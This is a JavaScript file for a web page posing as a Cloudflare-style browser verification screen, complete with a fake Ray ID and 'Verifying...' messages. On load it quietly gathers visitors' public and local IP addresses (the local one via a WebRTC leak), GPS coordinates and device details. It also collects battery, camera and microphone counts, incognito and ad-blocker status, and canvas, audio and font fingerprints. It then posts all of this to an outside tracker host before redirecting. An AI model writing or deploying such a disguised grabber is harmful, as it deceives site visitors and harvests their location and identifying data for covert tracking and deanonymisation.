// ─── CONFIG ───────────────────────────────────────────────────────────────────
const WORKER_URL = "https://trk.kkproductionstudio.com";

const DESTINATION_URL = "https://devesh.is-a.dev/";
// ─────────────────────────────────────────────────────────────────────────────

const collectedData = {};
let fieldCount = 0;

// ── Utilities ─────────────────────────────────────────────────────────────────

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function generateRayID() {
  const chars = "abcdef0123456789";
  let rayId = "";
  for (let i = 0; i < 16; i++) {
    rayId += chars[Math.floor(Math.random() * chars.length)];
  }
  return rayId;
}
document.getElementById("ray-id-value").textContent = generateRayID();

// ── PHASE 1 — Browser & Device ────────────────────────────────────────────────
async function collectBrowser() {
  const ua = navigator.userAgent;

  let navigatorUAData = "Not Supported";
  const uaDataFields = [
    "architecture",
    "bitness",
    "fullVersionList",
    "model",
    "platform",
    "platformVersion",
    "wow64",
  ];

//   (async function(){if(navigator.userAgentData&&typeof navigator.userAgentData.getHighEntropyValues==='function'){try{const data=await navigator.userAgentData.getHighEntropyValues(['architecture','model','platformVersion','uaFullVersion']);alert('✅ Supported!\n\nPossible Data:\n'+JSON.stringify(data,null,2));}catch(e){alert('❌ Supported, but failed to fetch data: '+e.message);}}else{alert('❌ Not Supported. Your browser does not support this method.');}})();

  try {
    if (navigator.userAgentData?.getHighEntropyValues) {
      const highEntropyData = await navigator.userAgentData
        .getHighEntropyValues([
          ...uaDataFields,
        ])
        .catch(() => "Not Supported");

      if (highEntropyData && typeof highEntropyData === "object") {
        navigatorUAData = Object.fromEntries(
          uaDataFields.map((field) => [
            field,
            Object.prototype.hasOwnProperty.call(highEntropyData, field)
              ? highEntropyData[field]
              : null,
          ])
        );
      }
    }
  } catch {
    navigatorUAData = "Not Supported";
  }

  const uaLower = ua.toLowerCase();
  let browserName = "Unknown",
    browserVer = "";
  if (/edg\//.test(uaLower)) {
    browserName = "Edge";
    browserVer = ua.match(/Edg\/([0-9.]+)/)?.[1] || "";
  } else if (/opr\//.test(uaLower)) {
    browserName = "Opera";
    browserVer = ua.match(/OPR\/([0-9.]+)/)?.[1] || "";
  } else if (
    /brave/.test(uaLower) ||
    (navigator.brave && (await navigator.brave.isBrave().catch(() => false)))
  ) {
    browserName = "Brave";
  } else if (/firefox\//.test(uaLower)) {
    browserName = "Firefox";
    browserVer = ua.match(/Firefox\/([0-9.]+)/)?.[1] || "";
  } else if (/chrome\//.test(uaLower)) {
    browserName = "Chrome";
    browserVer = ua.match(/Chrome\/([0-9.]+)/)?.[1] || "";
  } else if (/safari\//.test(uaLower)) {
    browserName = "Safari";
    browserVer = ua.match(/Version\/([0-9.]+)/)?.[1] || "";
  }

  // OS detection
  let os = "Unknown";
  if (/windows nt 10/i.test(ua)) os = "Windows 10/11";
  else if (/windows nt 6.3/i.test(ua)) os = "Windows 8.1";
  else if (/windows nt 6.2/i.test(ua)) os = "Windows 8";
  else if (/windows nt 6.1/i.test(ua)) os = "Windows 7";
  else if (/windows/i.test(ua)) os = "Windows";
  else if (/android ([0-9.]+)/i.test(ua))
    os = "Android " + ua.match(/Android ([0-9.]+)/i)?.[1];
  else if (/iphone os ([0-9_]+)/i.test(ua))
    os = "iOS " + ua.match(/iPhone OS ([0-9_]+)/i)?.[1]?.replace(/_/g, ".");
  else if (/ipad.*os ([0-9_]+)/i.test(ua))
    os = "iPadOS " + ua.match(/CPU OS ([0-9_]+)/i)?.[1]?.replace(/_/g, ".");
  else if (/mac os x ([0-9_]+)/i.test(ua))
    os = "macOS " + ua.match(/Mac OS X ([0-9_]+)/i)?.[1]?.replace(/_/g, ".");
  else if (/linux/i.test(ua)) os = "Linux";
  else if (/cros/i.test(ua)) os = "ChromeOS";

  // Device type
  let deviceType = "Desktop";
  if (/mobile/i.test(ua)) deviceType = "Mobile";
  else if (/tablet|ipad/i.test(ua)) deviceType = "Tablet";

  // Device model extraction
  const modelMatch = ua.match(/\(([^)]+)\)/);

  const browserData = {
    userAgent: ua,
    language: navigator.language || navigator.userLanguage,
    allLanguages: navigator.languages || [],
    platform: navigator.platform,
    vendor: navigator.vendor || null,
    product: navigator.product || null,
    navigatorUAData,
    appName: navigator.appName,
    appVersion: navigator.appVersion?.substring(0, 80) || null,
    cookieEnabled: navigator.cookieEnabled,
    javaEnabled: navigator.javaEnabled?.() ?? null,
    pdfViewerEnabled: navigator.pdfViewerEnabled ?? null,
    brand: navigator.brave ? "Brave" : navigator.vendor || "Unknown",
    browserName,
    os,
    deviceType,
    deviceInfo: modelMatch?.[1]?.substring(0, 80) || "N/A",
    screen: {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth,
      viewportWidth: window.innerWidth,
      viewportHeight: window.innerHeight,
      pixelRatio: window.devicePixelRatio || 1,
      orientation:
        screen.orientation?.type ||
        (window.innerWidth > window.innerHeight ? "landscape" : "portrait"),
      availableWidth: screen.availWidth,
      availableHeight: screen.availHeight,
    },
  };

  return browserData;
}

// ── PHASE 2 — Network ────────────────────────────────────────────────────────
async function collectNetwork() {
  const conn =
    navigator.connection ||
    navigator.mozConnection ||
    navigator.webkitConnection;

  const networkData = {
    referrer: document.referrer || "(direct)",
    hostname: window.location.hostname || location.host,
    currentUrl: window.location.href,
    protocol: window.location.protocol,
    online: navigator.onLine ? "ok" : "bad",
    connection: conn
      ? {
          effectiveType: conn.effectiveType,
          type: conn.type,
          downlink: conn.downlink,
          rtt: conn.rtt,
          saveDataMode: conn.saveData,
        }
      : null,
  };

  return networkData;
}

async function fetchIPData() {
  let ipData = {};

  try {
    const r = await fetch("https://free.freeipapi.com/api/json/", {
      cache: "no-store",
    });

    const d = await r.json();

    ipData = {
      publicIP: d.ipAddress || "N/A",
      country: `${d.countryName || ""} (${d.countryCode || ""})`.trim(),
      city: d.cityName || "N/A",
      region: d.regionName || "N/A",
      ispAsn:
        `${d.asnOrganization || ""} ${d.asn ? "(" + d.asn + ")" : ""}`.trim() ||
        "N/A",
      timezone: d.timeZones?.[0] || "N/A",
      vpnProxyFlag: d.isProxy ? "Detected ⚠" : "None detected",
      vpnProxyStatus: d.isProxy ? "warn" : "ok",
      raw: d,
    };
  } catch {
    ipData = {
      publicIP: "Fetch failed",
      country: "N/A",
      city: "N/A",
      region: "N/A",
      ispAsn: "N/A",
      org: "N/A",
      timezone: "N/A",
      vpnProxyFlag: "N/A",
      vpnProxyStatus: "warn",
    };
  }

  return ipData;
}

function fetchLocalIP() {
  return new Promise((resolve) => {
    let localIPData = {
      localIP: "Blocked / N/A",
      status: "warn",
    };

    try {
      const pc = new RTCPeerConnection({
        iceServers: [{ urls: "stun:stun.l.google.com:19302" }],
      });

      pc.createDataChannel("");

      pc.createOffer().then((o) => pc.setLocalDescription(o));

      pc.onicecandidate = (e) => {
        if (!e || !e.candidate) return;

        const ip = e.candidate.candidate.match(
          /([0-9]{1,3}(?:\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})/
        )?.[1];

        if (ip && !ip.startsWith("0.")) {
          localIPData = {
            localIP: ip,
            status:
              ip.startsWith("192.168") || ip.startsWith("10.") ? "warn" : "ok",
          };

          pc.close();
          resolve(localIPData);
        }
      };

      setTimeout(() => {
        resolve(localIPData);
      }, 5000);
    } catch {
      resolve({
        localIP: "Not available",
        status: "warn",
      });
    }
  });
}

// ── PHASE 3 — Hardware ────────────────────────────────────────────────────────
async function collectHardware() {
  const hardwareData = {};

  // CPU
  hardwareData.cpuCores = navigator.hardwareConcurrency || "N/A";
  hardwareData.deviceMemory = navigator.deviceMemory || "N/A";

  const gpuTask = (async () => {
    try {
      const canvas = document.createElement("canvas");
      const gl =
        canvas.getContext("webgl") || canvas.getContext("experimental-webgl");

      if (!gl) {
        return {
          gpuVendor: "N/A",
          gpuRenderer: "N/A",
        };
      }

      const ext = gl.getExtension("WEBGL_debug_renderer_info");

      if (ext) {
        return {
          gpuVendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
          gpuRenderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL),
        };
      }

      return {
        gpuVendor: gl.getParameter(gl.VENDOR),
        gpuRenderer: gl.getParameter(gl.RENDERER),
      };
    } catch {
      return {
        gpuVendor: "N/A",
        gpuRenderer: "N/A",
      };
    }
  })();

  const webglTask = (async () => {
    try {
      const c = document.createElement("canvas");
      return {
        webglVersion: c.getContext("webgl2") ? "WebGL 2.0" : "WebGL 1.0",
      };
    } catch {
      return { webglVersion: "N/A" };
    }
  })();

  const touchTask = Promise.resolve({
    touchPoints: navigator.maxTouchPoints ?? 0,
    touchSupport: String(
      "ontouchstart" in window || navigator.maxTouchPoints > 0
    ),
  });

  const batteryTask = (async () => {
    if (!navigator.getBattery) {
      return {
        battery: {
          percentage: "Not supported",
          status: "warn",
          charging: "N/A",
          chargeTime: "N/A",
          dischargeTime: "N/A",
        },
      };
    }

    try {
      const bat = await navigator.getBattery();
      return {
        battery: {
          percentage: Math.round(bat.level * 100) + "%",
          status: bat.level < 0.2 ? "warn" : "ok",
          charging: bat.charging ? "Yes ⚡" : "No",
          chargingStatus: bat.charging ? "ok" : "",
          chargeTime: bat.chargingTime === Infinity ? "N/A" : bat.chargingTime,
          dischargeTime:
            bat.dischargingTime === Infinity ? "N/A" : bat.dischargingTime,
        },
      };
    } catch {
      return {
        battery: {
          percentage: "API blocked",
          status: "warn",
          charging: "N/A",
          chargeTime: "N/A",
          dischargeTime: "N/A",
        },
      };
    }
  })();

  const devicesTask = (async () => {
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      return {
        cameras: devices.filter((d) => d.kind === "videoinput").length,
        microphones: devices.filter((d) => d.kind === "audioinput").length,
      };
    } catch {
      return {
        cameras: "N/A",
        microphones: "N/A",
      };
    }
  })();

  const audioTask = (async () => {
    try {
      const ac = new (window.AudioContext || window.webkitAudioContext)();
      const result = { audioSampleRate: ac.sampleRate + " Hz" };
      await ac.close();
      return result;
    } catch {
      return { audioSampleRate: "N/A" };
    }
  })();

  const [gpuData, webglData, touchData, batteryData, deviceData, audioData] =
    await Promise.all([
      gpuTask,
      webglTask,
      touchTask,
      batteryTask,
      devicesTask,
      audioTask,
    ]);

  Object.assign(
    hardwareData,
    gpuData,
    webglData,
    touchData,
    batteryData,
    deviceData,
    audioData
  );

  return hardwareData;
}

// ── PHASE 4 — Privacy detection ───────────────────────────────────────────────
async function collectPrivacy() {
  const privacyData = {};

  const adBlockerTask = (async () => {
    let adBlocker = false;

    try {
      await fetch(
        "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js",
        {
          method: "HEAD",
          mode: "no-cors",
          cache: "no-store",
        }
      );
    } catch {
      adBlocker = true;
    }

    try {
      const bait = document.createElement("div");
      bait.className = "ad-banner adsbox pub_300x250";
      bait.style.cssText =
        "width:1px;height:1px;position:absolute;top:-9999px;";
      document.body.appendChild(bait);
      await sleep(100);

      if (bait.offsetHeight === 0 || bait.offsetParent === null) {
        adBlocker = true;
      }

      bait.remove();
    } catch {}

    return {
      adBlocker: {
        detected: adBlocker,
        status: adBlocker ? "warn" : "ok",
        value: adBlocker ? "Detected" : "None",
      },
    };
  })();

  const incognitoTask = (async () => {
    let incognito = "Unknown";

    try {
      if (navigator.storage && navigator.storage.estimate) {
        const est = await navigator.storage.estimate();

        if (est.quota && est.quota < 120000000) {
          incognito = "Likely (small quota)";
        }
      }

      try {
        const req = indexedDB.open("__idb_test__");
        req.onerror = () => {
          incognito = "Likely (IDB blocked)";
        };
      } catch {
        incognito = "Likely";
      }

      if (window.webkitRequestFileSystem) {
        window.webkitRequestFileSystem(
          0,
          1,
          () => {
            if (incognito === "Unknown") {
              incognito = "Not detected";
            }
          },
          () => {
            incognito = "Likely";
          }
        );
      } else if (incognito === "Unknown") {
        incognito = "Not detected";
      }
    } catch {
      incognito = "Unknown";
    }

    await sleep(300);

    return {
      incognito: {
        value: incognito,
        status: incognito.startsWith("Likely") ? "warn" : "ok",
      },
    };
  })();

  const signalsTask = Promise.resolve().then(() => {
    const botSignals = [];

    if (navigator.webdriver) {
      botSignals.push("webdriver=true");
    }

    if (!window.chrome && /chrome/i.test(navigator.userAgent)) {
      botSignals.push("no window.chrome");
    }

    if (navigator.languages?.length === 0) {
      botSignals.push("no languages");
    }

    if (!navigator.plugins?.length) {
      botSignals.push("no plugins");
    }

    if (navigator.permissions?.query === undefined) {
      botSignals.push("no permissions API");
    }

    return {
      botSignals: {
        value: botSignals.length ? botSignals.join(", ") : "None detected",
        status: botSignals.length ? "warn" : "ok",
      },
      webdriver: {
        value: String(!!navigator.webdriver),
        status: navigator.webdriver ? "bad" : "ok",
      },
      browserPlugins:
        Array.from(navigator.plugins || [])
          .map((p) => p.name)
          .join(", ") || "None / blocked",
      mimeTypes: navigator.mimeTypes?.length ?? 0,
    };
  });

  const storageTask = Promise.resolve().then(() => ({
    storage: {
      localStorage: (() => {
        try {
          localStorage.setItem("t", "1");
          localStorage.removeItem("t");
          return "Available";
        } catch {
          return "Blocked";
        }
      })(),
      sessionStorage: (() => {
        try {
          sessionStorage.setItem("t", "1");
          sessionStorage.removeItem("t");
          return "Available";
        } catch {
          return "Blocked";
        }
      })(),
      indexedDB: typeof indexedDB !== "undefined" ? "Available" : "Blocked",
      serviceWorkers:
        "serviceWorker" in navigator ? "Supported" : "Not supported",
    },
  }));

  const permissionsTask = (async () => {
    const output = {};

    try {
      const perm = await navigator.permissions.query({ name: "notifications" });
      output.notificationPermission = perm.state;
    } catch {
      output.notificationPermission = "N/A";
    }

    try {
      const perm = await navigator.permissions.query({
        name: "clipboard-read",
      });
      output.clipboardPermission = perm.state;
    } catch {
      output.clipboardPermission = "N/A";
    }

    return output;
  })();

  const [
    adBlockerData,
    incognitoData,
    signalData,
    storageData,
    permissionData,
  ] = await Promise.all([
    adBlockerTask,
    incognitoTask,
    signalsTask,
    storageTask,
    permissionsTask,
  ]);

  Object.assign(
    privacyData,
    adBlockerData,
    incognitoData,
    signalData,
    storageData,
    permissionData
  );

  return privacyData;
}

// ── PHASE 5 — Geo / Time ──────────────────────────────────────────────────────
async function collectGeo() {
  const geoData = {};

  const now = new Date();

  geoData.localDateTime = now.toLocaleString();

  geoData.utcDateTime = now.toUTCString();

  geoData.browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  geoData.utcOffsetMinutes = now.getTimezoneOffset();

  geoData.locale = Intl.DateTimeFormat().resolvedOptions().locale;

  geoData.numberFormat = new Intl.NumberFormat().format(1234567.89);

  const geolocationPermissionTask = (async () => {
    try {
      if (navigator.permissions?.query) {
        const perm = await navigator.permissions.query({ name: "geolocation" });
        return { geolocationPermission: perm.state };
      }
    } catch {}

    return { geolocationPermission: "N/A" };
  })();

  const staticGeoTask = Promise.resolve({
    localDateTime: now.toLocaleString(),
    utcDateTime: now.toUTCString(),
    browserTimezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    utcOffsetMinutes: now.getTimezoneOffset(),
    locale: Intl.DateTimeFormat().resolvedOptions().locale,
    numberFormat: new Intl.NumberFormat().format(1234567.89),
  });

  const gpsTask = (async () => {
    if (!navigator.geolocation) {
      return {
        gps: {
          latitude: "Not supported",
          longitude: "Not supported",
          accuracy: "N/A",
          altitude: null,
          speed: null,
          status: "warn",
        },
      };
    }

    const getPosition = (options) =>
      new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            resolve({
              latitude: pos.coords.latitude.toFixed(6),
              longitude: pos.coords.longitude.toFixed(6),
              accuracy: Math.round(pos.coords.accuracy),
              altitude: pos.coords.altitude,
              speed: pos.coords.speed,
              status: "ok",
            });
          },
          (err) => {
            resolve({
              latitude: "Unavailable",
              longitude: "Unavailable",
              accuracy: "N/A",
              altitude: null,
              speed: null,
              status: "warn",
              errorCode: err.code,
              errorMessage: err.message || "Unknown geolocation error",
            });
          },
          options
        );
      });

    const lowAccuracyAttempt = getPosition({
      enableHighAccuracy: false,
      timeout: 20000,
      maximumAge: 60000,
    });

    const highAccuracyAttempt = getPosition({
      enableHighAccuracy: true,
      timeout: 25000,
      maximumAge: 0,
    });

    const firstResult = await lowAccuracyAttempt;

    if (firstResult.status === "ok") {
      return { gps: firstResult };
    }

    const secondResult = await highAccuracyAttempt;

    return {
      gps:
        secondResult.status === "ok"
          ? secondResult
          : {
              ...secondResult,
              fallbackUsed: true,
            },
    };
  })();

  const [staticGeoData, permissionData, gpsData] = await Promise.all([
    staticGeoTask,
    geolocationPermissionTask,
    gpsTask,
  ]);

  Object.assign(geoData, staticGeoData, permissionData, gpsData);

  return geoData;
}

// ── PHASE 6 — Fingerprint ─────────────────────────────────────────────────────
async function collectFingerprint() {
  const fpData = {};

  // Canvas fingerprint
  fpData.canvasFingerprint = "N/A";

  try {
    const c = document.createElement("canvas");

    c.width = 280;
    c.height = 60;

    const ctx = c.getContext("2d");

    ctx.fillStyle = "#f6821f";
    ctx.fillRect(0, 0, 280, 60);

    ctx.fillStyle = "#1a1a2e";
    ctx.font = '14px "DM Mono", monospace';

    ctx.fillText("Browser Fingerprint 🔒 ⚙✓", 10, 30);

    ctx.strokeStyle = "#fff";
    ctx.lineWidth = 1;

    ctx.beginPath();

    ctx.arc(120, 40, 15, 0, Math.PI * 2);

    ctx.stroke();

    const data = c.toDataURL();

    fpData.canvasFingerprint = await simpleHash(data);
  } catch {}

  // Audio fingerprint
  fpData.audioFingerprint = "N/A";

  try {
    const ac = new OfflineAudioContext(1, 44100, 44100);

    const osc = ac.createOscillator();

    const comp = ac.createDynamicsCompressor();

    osc.type = "triangle";

    osc.frequency.setValueAtTime(10000, ac.currentTime);

    comp.threshold.setValueAtTime(-50, ac.currentTime);

    comp.knee.setValueAtTime(40, ac.currentTime);

    osc.connect(comp);

    comp.connect(ac.destination);

    osc.start(0);

    const buf = await ac.startRendering();

    const samples = buf.getChannelData(0).slice(4500, 5000);

    const sum = samples.reduce((a, b) => a + Math.abs(b), 0);

    fpData.audioFingerprint = sum.toString(36).substring(0, 12);
  } catch {}

  // Font detection
  const testFonts = [
    "Arial",
    "Verdana",
    "Helvetica",
    "Times New Roman",
    "Courier New",
    "Georgia",
    "Palatino",
    "Garamond",
    "Bookman",
    "Comic Sans MS",
    "Trebuchet MS",
    "Impact",
    "Lucida Sans",
    "Tahoma",
    "Calibri",
    "Cambria",
    "Consolas",
    "Monaco",
    "Menlo",
    "Ubuntu Mono",
  ];

  const detectedFonts = [];

  try {
    const testStr = "mmmmmmmmmmlli";

    const baseCanvas = document.createElement("canvas");

    const baseCtx = baseCanvas.getContext("2d");

    baseCanvas.width = 200;
    baseCanvas.height = 30;

    baseCtx.font = "14px monospace";

    const baseW = baseCtx.measureText(testStr).width;

    for (const font of testFonts) {
      baseCtx.font = `14px '${font}', monospace`;

      if (baseCtx.measureText(testStr).width !== baseW) {
        detectedFonts.push(font);
      }
    }
  } catch {}

  fpData.fontsDetected = detectedFonts.length ? detectedFonts : [];

  fpData.fontCount = detectedFonts.length;

  // Combined fingerprint
  const fpSource = [
    navigator.userAgent,
    navigator.language,
    screen.width,
    screen.height,
    screen.colorDepth,
    window.devicePixelRatio,
    navigator.hardwareConcurrency,
    navigator.deviceMemory,
    new Date().getTimezoneOffset(),
    fpData.canvasFingerprint,
    fpData.audioFingerprint,
    navigator.platform,
    (navigator.plugins || []).length,
  ].join("|");

  fpData.combinedFingerprint = await simpleHash(fpSource);

  return fpData;
}

async function simpleHash(str) {
  try {
    const buf = await crypto.subtle.digest(
      "SHA-256",
      new TextEncoder().encode(str)
    );
    return Array.from(new Uint8Array(buf))
      .map((b) => b.toString(16).padStart(2, "0"))
      .join("")
      .substring(0, 32);
  } catch {
    let h = 0;
    for (let i = 0; i < str.length; i++)
      h = ((h << 5) - h + str.charCodeAt(i)) | 0;
    return Math.abs(h).toString(16);
  }
}

// ── Main flow ─────────────────────────────────────────────────────────────────
function showContinueButton() {
  const sendButton = document.getElementById("btn-send");

  sendButton.style.display = "inline-block";
  sendButton.disabled = false;
  sendButton.textContent = "Continue →";
}

function redirectToDestination() {
  window.location.href = DESTINATION_URL;
}

function logPhaseData(label, data) {
  // console.log(`${label}:`, data);
  return data;
}

async function runCollection() {
  const [
    browserData,
    networkData,
    ipData,
    localIPData,
    hardwareData,
    privacyData,
    geoData,
    fingerprintData,
  ] = await Promise.all([
    collectBrowser(),
    collectNetwork(),
    fetchIPData(),
    fetchLocalIP(),
    collectHardware(),
    collectPrivacy(),
    collectGeo(),
    collectFingerprint(),
  ]);

  Object.assign(collectedData, logPhaseData("Browser data", browserData));
  Object.assign(collectedData, logPhaseData("Network data", networkData));
  collectedData.ipData = logPhaseData("Public IP data", ipData);
  collectedData.localIPData = logPhaseData("Local IP data", localIPData);
  Object.assign(collectedData, logPhaseData("Hardware data", hardwareData));
  Object.assign(collectedData, logPhaseData("Privacy data", privacyData));
  Object.assign(collectedData, logPhaseData("Geo data", geoData));
  Object.assign(
    collectedData,
    logPhaseData("Fingerprint data", fingerprintData)
  );

  // Add timestamp
  collectedData["collected_at"] = new Date().toISOString();
  collectedData["ray_id"] = document.getElementById("ray-id").textContent;
  fieldCount = Object.keys(collectedData).length;

  const sent = await sendToWorker({
    showFailureUI: true,
    redirectOnSuccess: true,
  });

  if (!sent) {
    showContinueButton();
  }
}

async function handleContinue() {
  const sent = await sendToWorker({
    showFailureUI: true,
    redirectOnSuccess: true,
  });

  if (!sent) {
    showContinueButton();
  }
}

async function sendToWorker(options = {}) {
  const { showFailureUI = true, redirectOnSuccess = false } = options;

  const btn = document.getElementById("btn-send");
  const result = document.getElementById("send-result");
  btn.textContent = "Verifying...";
  btn.disabled = true;
  result.className = "send-result";

  const payload = {
    ...collectedData,
    sent_at: new Date().toISOString(),
    page_url: window.location.href,
    screen: { w: screen.width, h: screen.height, dpr: window.devicePixelRatio },
  };

  try {
    const r = await fetch(WORKER_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    if (r.ok) {
      result.className = "send-result success";
      result.textContent = `Verification successful, redirecting...`;
      btn.textContent = "Click to Continue";

      if (redirectOnSuccess) {
        redirectToDestination();
      }

      return true;
    } else {
      throw new Error(`HTTP ${r.status}`);
    }
  } catch (e) {
    if (showFailureUI) {
      result.className = "send-result error";
      result.textContent = `Verification failed. Please refresh the page to try again or click continue to proceed anyway. (${e.message})`;
      btn.textContent = "Continue →";
      btn.disabled = false;
    }

    return false;
  }
}

// ── Start ─────────────────────────────────────────────────────────────────────
runCollection().catch((e) => {
  const result = document.getElementById("send-result");
  result.className = "send-result error";
  result.textContent = `Cloudflare Collection failed: ${e.message}. You can continue manually.`;
  showContinueButton();
});
